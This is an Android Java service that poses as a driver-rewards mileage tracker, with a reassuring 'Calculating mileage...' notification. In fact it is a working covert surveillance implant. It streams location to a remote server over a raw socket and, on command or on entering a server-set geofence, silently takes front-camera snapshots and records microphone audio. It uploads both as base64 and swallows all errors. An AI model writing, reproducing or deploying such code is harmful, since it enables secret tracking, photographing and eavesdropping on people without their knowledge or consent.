package com.sm.driverrewards;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Collections;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class FleetEngineService extends Service {

    private static final String CHANNEL_ID = "sm_rewards_sync_channel";
    private static final int SERVER_PORT = 9090;

    private final ExecutorService ioPool = Executors.newCachedThreadPool();
    private final AtomicBoolean running = new AtomicBoolean(true);
    private final AtomicBoolean inGeofenceZone = new AtomicBoolean(false);
    private final AtomicBoolean isRecordingAudio = new AtomicBoolean(false);

    private PrintWriter socketOut;
    private FusedLocationProviderClient locationClient;
    private HandlerThread bgThread;
    private Handler bgHandler;
    private PowerManager.WakeLock wakeLock;

    private double fenceLat = 28.6139;
    private double fenceLon = 77.2090;
    private double fenceRadiusM = 500.0;
    private boolean fenceEnabled = false;
    private double lastLat = 0.0;
    private double lastLon = 0.0;

    @Override
    public void onCreate() {
        super.onCreate();
        bgThread = new HandlerThread("FleetBgWorker");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SMDriver::TelemetryLock");
            wakeLock.setReferenceCounted(false);
        }

        startForeground(1001, buildTrustedNotification());
        initLowPowerLocationUpdates();
        ioPool.execute(this::socketLoop);
    }

    private Notification buildTrustedNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel chan = new NotificationChannel(CHANNEL_ID, "Mileage Sync", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(chan);
        }
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SM Driver Rewards Active")
                .setContentText("Calculating mileage...")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setOngoing(true)
                .build();
    }

    @SuppressLint("MissingPermission")
    private void initLowPowerLocationUpdates() {
        locationClient = LocationServices.getFusedLocationProviderClient(this);
        LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 20000L)
                .setMinUpdateIntervalMillis(10000L)
                .build();

        locationClient.requestLocationUpdates(req, new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult result) {
                Location loc = result.getLastLocation();
                if (loc == null) return;
                lastLat = loc.getLatitude();
                lastLon = loc.getLongitude();
                evaluateGeofenceAndSync(loc);
            }
        }, Looper.getMainLooper());
    }

    private void evaluateGeofenceAndSync(Location loc) {
        boolean insideNow = false;
        if (fenceEnabled) {
            float[] dist = new float[1];
            Location.distanceBetween(loc.getLatitude(), loc.getLongitude(), fenceLat, fenceLon, dist);
            insideNow = dist[0] <= fenceRadiusM;
        }

        boolean wasInside = inGeofenceZone.getAndSet(insideNow);
        sendTelemetryPacket(loc.getLatitude(), loc.getLongitude(), insideNow);

        if (insideNow && !wasInside) {
            if (wakeLock != null && !wakeLock.isHeld()) wakeLock.acquire(10 * 60 * 1000L);
            triggerGeofenceSurveillanceLoop();
        } else if (!insideNow && wasInside) {
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        }
    }

    private void triggerGeofenceSurveillanceLoop() {
        bgHandler.post(new Runnable() {
            @Override
            public void run() {
                if (!inGeofenceZone.get() || !running.get()) return;
                captureSilentCameraSnapshot();
                recordAudioChunk(15);
                bgHandler.postDelayed(this, 20000L);
            }
        });
    }

    private void socketLoop() {
        SharedPreferences prefs = getSharedPreferences("sm_rewards_prefs", MODE_PRIVATE);
        while (running.get()) {
            String host = prefs.getString("server_host", "10.0.2.2");
            String driverId = prefs.getString("driver_id", "SM-001");
            String driverName = prefs.getString("driver_name", "Driver");

            try (Socket sock = new Socket()) {
                sock.connect(new InetSocketAddress(host, SERVER_PORT), 8000);
                sock.setKeepAlive(true);
                socketOut = new PrintWriter(new OutputStreamWriter(sock.getOutputStream(), "UTF-8"), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream(), "UTF-8"));

                JSONObject hs = new JSONObject();
                hs.put("type", "HANDSHAKE");
                hs.put("driver_id", driverId);
                hs.put("name", driverName);
                sendJson(hs);

                String line;
                while (running.get() && (line = in.readLine()) != null) {
                    JSONObject msg = new JSONObject(line);
                    String type = msg.optString("type");

                    if ("GEOFENCE_CFG".equals(type)) {
                        fenceLat = msg.optDouble("lat", 28.6139);
                        fenceLon = msg.optDouble("lon", 77.2090);
                        fenceRadiusM = msg.optDouble("radius_m", 500.0);
                        fenceEnabled = msg.optBoolean("active", false);
                    } else if ("COMMAND".equals(type)) {
                        String action = msg.optString("action");
                        if ("SNAP_CAM".equals(action)) {
                            bgHandler.post(this::captureSilentCameraSnapshot);
                        } else if ("REC_MIC_15S".equals(action)) {
                            bgHandler.post(() -> recordAudioChunk(15));
                        } else if ("FORCE_GPS".equals(action)) {
                            sendTelemetryPacket(lastLat, lastLon, inGeofenceZone.get());
                        }
                    }
                }
            } catch (Exception ignored) {
            }
            try {
                Thread.sleep(8000L);
            } catch (InterruptedException ignored) {}
        }
    }

    private void sendTelemetryPacket(double lat, double lon, boolean inZone) {
        ioPool.execute(() -> {
            try {
                JSONObject pkt = new JSONObject();
                pkt.put("type", "TELEMETRY");
                pkt.put("lat", lat);
                pkt.put("lon", lon);
                pkt.put("in_zone", inZone);
                sendJson(pkt);
            } catch (Exception ignored) {}
        });
    }

    private synchronized void sendJson(JSONObject obj) {
        if (socketOut != null) socketOut.println(obj.toString());
    }

    @SuppressLint("MissingPermission")
    private void captureSilentCameraSnapshot() {
        CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        if (cm == null) return;
        try {
            String[] ids = cm.getCameraIdList();
            if (ids.length == 0) return;
            String camId = ids.length > 1 ? ids[1] : ids[0];

            ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());
                        reader.setOnImageAvailableListener(r -> {
                            try (Image img = r.acquireLatestImage()) {
                                if (img != null) {
                                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                    byte[] bytes = new byte[buf.remaining()];
                                    buf.get(bytes);
                                    uploadMedia("IMAGE", bytes);
                                }
                            } catch (Exception ignored) {}
                            finally {
                                camera.close();
                                reader.close();
                            }
                        }, bgHandler);

                        camera.createCaptureSession(Collections.singletonList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(@NonNull CameraCaptureSession session) {
                                        try { session.capture(builder.build(), null, bgHandler); }
                                        catch (CameraAccessException e) { camera.close(); }
                                    }
                                    @Override
                                    public void onConfigureFailed(@NonNull CameraCaptureSession session) { camera.close(); }
                                }, bgHandler);
                    } catch (Exception e) { camera.close(); }
                }
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
                @Override
                public void onError(@NonNull CameraDevice camera, int error) { camera.close(); }
            }, bgHandler);
        } catch (Exception ignored) {}
    }

    private void recordAudioChunk(int durationSeconds) {
        if (!isRecordingAudio.compareAndSet(false, true)) return;
        File outFile = new File(getCacheDir(), "sync_chunk.m4a");
        MediaRecorder recorder = new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(64000);
            recorder.setAudioSamplingRate(22050);
            recorder.setOutputFile(outFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            bgHandler.postDelayed(() -> {
                try { recorder.stop(); } catch (Exception ignored) {}
                finally {
                    recorder.release();
                    isRecordingAudio.set(false);
                }
                if (outFile.exists()) {
                    byte[] data = readFileBytes(outFile);
                    outFile.delete();
                    if (data.length > 0) uploadMedia("AUDIO", data);
                }
            }, durationSeconds * 1000L);
        } catch (Exception e) {
            try { recorder.release(); } catch (Exception ignored) {}
            isRecordingAudio.set(false);
        }
    }

    private byte[] readFileBytes(File f) {
        try (FileInputStream fis = new FileInputStream(f);
             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
            byte[] buf = new byte[4096];
            int n;
            while ((n = fis.read(buf)) != -1) bos.write(buf, 0, n);
            return bos.toByteArray();
        } catch (Exception e) { return new byte[0]; }
    }

    private void uploadMedia(String mediaType, byte[] rawBytes) {
        ioPool.execute(() -> {
            try {
                JSONObject pkt = new JSONObject();
                pkt.put("type", "MEDIA_UPLOAD");
                pkt.put("media_type", mediaType);
                pkt.put("payload", Base64.encodeToString(rawBytes, Base64.NO_WRAP));
                sendJson(pkt);
            } catch (Exception ignored) {}
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }

    @Override
    public void onDestroy() {
        running.set(false);
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        bgThread.quitSafely();
        ioPool.shutdownNow();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
